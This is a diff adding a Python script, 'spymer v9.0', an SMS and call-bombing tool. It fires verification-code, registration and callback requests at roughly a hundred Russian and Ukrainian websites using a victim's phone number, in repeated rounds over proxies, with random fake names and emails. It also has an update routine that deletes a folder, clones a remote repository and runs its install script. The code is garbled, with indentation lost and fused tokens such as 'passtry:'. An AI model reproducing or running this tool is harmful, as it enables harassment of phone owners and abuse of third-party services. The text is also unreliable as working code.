@@ -1,0 +1,578 @@
+#!usr/bin/python3
+# -*- coding: utf-8 -*-
+# spymer v9.0
+# Author: lebedka
+import os
+def MAIN():
+try:
+import requests
+import random
+import datetime
+import sys
+import re
+import time
+import datetime
+import json
+import threading
+from threading import Thread
+from colorama import Fore, Back, Style
+from random import randint
+def Main():
+global phone
+global info
+global proxy
+global proxies
+
+r = Fore.RED
+g = Fore.GREEN
+y = Fore.YELLOW
+s = Style.RESET_ALL
+
+def mask(str, maska):
+if len(str) == maska.count('#'):
+str_list = list(str)
+for i in str_list:
+maska=maska.replace("#", i, 1)
+return maska
+
+def sms():
+global phone
+global name
+global password
+global email
+global proxies
+phone9 = phone[1:]
+try:try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone[1:], maska="8(###)###-##-##")
+requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=10)
+except:
+passtry:
+requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
+requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, proxies=proxies, timeout=10) 
+except:
+passtry:
+# под сомнением 
+phonee=mask(str=phone, maska="#(###)###-##-##")
+requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=10)
+
+phonee=mask(str=phone, maska="+#(###)###-##-##")
+requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="8(###)###-##-##")
+requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+passtry:
+requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(phone, maska="+# (###) ### - ## - ##")
+requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="(+#)##########")
+requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone9, maska="8(###)###-##-##")
+requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+
+try:
+phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone9, maska="8-###-###-##-##")
+requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+#(###)###-##-##")
+requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonee, "alien": "0"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+#-###-###-##-##")
+requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonee}}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-##-##")
+requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone9, maska="8-###-###-##-##")
+requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-####")
+requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+#-###-###-##-##")
+requests.post("https://paylate.ru/registry",data={"mobile": phonee,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ###-####")
+requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.ollis.ru/gql",json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonee,"call_time": "1","pravila2": "on"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data={"+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# (###) ### ## ##")
+requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonee, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio":name, "phone":phone, "phone_number":"1"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+phonee=mask(str=phone, maska="+# ### ### ## ##")
+requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonee}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"}, proxies=proxies, timeout=10)
+except:
+pass
+try:
+requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"}, proxies=proxies, timeout=10)
+except:
+pass
+
+def clear():
+os.system('cls' if os.name=='nt' else 'clear')
+
+def checkver():
+global info
+ver = '90'
+version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
+if int(ver) < int(version):
+info=Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
+
+def logo():
+logo = r+" ██╗░░░░░███████╗██████╗░███████╗██████╗░
+██║░░░░░██╔════╝██╔══██╗██╔════╝██╔══██╗
+██║░░░░░█████╗░░██████╦╝█████╗░░██║░░██║
+██║░░░░░██╔══╝░░██╔══██╗██╔══╝░░██║░░██║
+███████╗███████╗██████╦╝███████╗██████╔╝
+╚══════╝╚══════╝╚═════╝░╚══════╝╚═════╝░ "+s+"by lebedka"+r+" ░░░\n"+y+" [ SMS Spammer ~ v.9.0 ~ MPL-2.0 ]\n [ Dev: lebedka ~ prod. by sss clab ]"+s
+print(logo)
+
+def make7phone():
+global phone
+if phone[0] == '+':
+phone = phone[1:]
+elif phone[0] == '8':
+phone = '7'+phone[1:]
+elif phone[0] == '9':
+phone = '7'+phone
+
+def addparams():
+global name
+global password
+global email
+name = ''
+for x in range(12):
+name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+email = "{}@gmail.com".format(name)
+
+def update():
+a=input("Вы уверены, что хотите обновить? (y/n) ")
+if a=="y":
+os.system("cd && rm -rf spymer && git clone https://github.com/FSystem88/spymer && cd spymer && sh install.sh")
+exit()
+else:
+print("Отменено")
+
+def onesend():
+global phone
+global name
+global password
+global email
+global proxy
+global info
+global proxies
+clear()
+logo()
+print(info)
+print('Введите телефон ("Enter" - отмена):')
+phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+try:
+if int(phone):
+print('Введите количество кругов ("Enter" - отмена):')
+count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+try:
+if int(count):
+count=int(count)
+make7phone()
+iteration = 0
+addparams()
+info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
+clear()
+logo()
+print(info)
+if proxy=="localhost":
+proxies=None
+else:
+proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}
+while iteration < count:
+addparams()
+sms()
+iteration+=1
+print("{} круг пройден.".format(iteration))
+info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
+except:
+info=Fore.RED+"Неверно введено кол-во кругов"+Style.RESET_ALL
+except:
+info=Fore.RED+"Неверно введен номер телефона"+Style.RESET_ALL
+
+def n_send(phone, count, proxies):
+global name
+global password
+global email
+global info
+iteration=0
+while iteration < count:
+addparams()
+sms()
+iteration+=1
+print(Fore.GREEN+"{}".format(phone)+Style.RESET_ALL+": круг №{} пройден.".format(iteration))
+print(Fore.GREEN+"\nСпам на {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
+exit()
+
+def main():
+global phone
+global info
+global proxy
+
+global proxies 
+proxy = "localhost"
+info = " "
+while True:
+clear()
+logo()
+print(info)
+checkver()
+print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
+if proxy == "localhost":
+print(Fore.YELLOW+"Советую использовать прокси !!!"+Style.RESET_ALL)
+print("1) СМС спамер.")
+print("2) Обновить прокси.")
+print("3) Обновить SPYMER.")
+print("4) Выход.")
+input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
+if input1 == "1":
+clear()
+logo()
+print(info)
+print("Выберите один вариант:")
+print("1. Запустить спамер на один номер")
+input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+if input11 == "1":
+onesend()
+else:
+print("Некорректно")
